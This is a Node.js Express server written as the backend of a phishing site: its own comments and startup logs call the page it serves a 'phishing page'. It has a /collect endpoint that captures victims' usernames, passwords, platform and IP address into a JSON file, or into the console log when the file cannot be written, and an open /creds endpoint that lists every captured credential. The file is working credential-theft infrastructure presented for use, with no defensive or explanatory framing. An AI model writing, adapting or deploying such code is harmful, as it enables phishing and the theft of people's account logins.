const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static("public")); // Serve your HTML from /public folder

// Credentials storage file
const credsFile = path.join(__dirname, "credentials.json");

// Ensure file exists
try {
  if (!fs.existsSync(credsFile)) {
    fs.writeFileSync(credsFile, JSON.stringify([], null, 2));
  }
} catch (err) {
  console.log("Could not create credentials file (likely read-only fs), skipping initialization.");
}

// Collect credentials endpoint
app.post("/collect", (req, res) => {
  const { username, password, platform } = req.body;

  if (username && password) {
    const cred = {
      timestamp: new Date().toISOString(),
      username,
      password,
      platform: platform || "unknown",
      ip: req.ip || req.connection.remoteAddress,
    };

    try {
      let creds = [];
      if (fs.existsSync(credsFile)) {
        const content = fs.readFileSync(credsFile, "utf8");
        if (content.trim()) {
          creds = JSON.parse(content);
        }
      }
      creds.push(cred);
      fs.writeFileSync(credsFile, JSON.stringify(creds, null, 2));
      console.log(`🆕 New cred captured: ${username} | ${platform}`);
      res.json({ success: true, message: "Received" });
    } catch (err) {
      if (err.code === 'EROFS') {
        console.log(`⚠️ Read-only filesystem detected. Logging credentials instead:`);
        console.log(JSON.stringify(cred, null, 2));
        return res.json({ success: true, message: "Received (Logged to console)" });
      }
      console.error("Error saving credentials:", err);
      res.status(500).json({ error: "Failed to save data" });
    }
  } else {
    res.status(400).json({ error: "Missing credentials" });
  }
});

// GET endpoint to view all credentials (for testing)
app.get("/creds", (req, res) => {
  try {
    const creds = JSON.parse(fs.readFileSync(credsFile, "utf8"));
    res.json(creds);
  } catch (e) {
    res.json([]);
  }
});

// Serve HTML (your phishing page)
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Phishing page: https://your-replit-url.replit.dev`);
  console.log(`📊 View creds: https://your-replit-url.replit.dev/creds`);
});
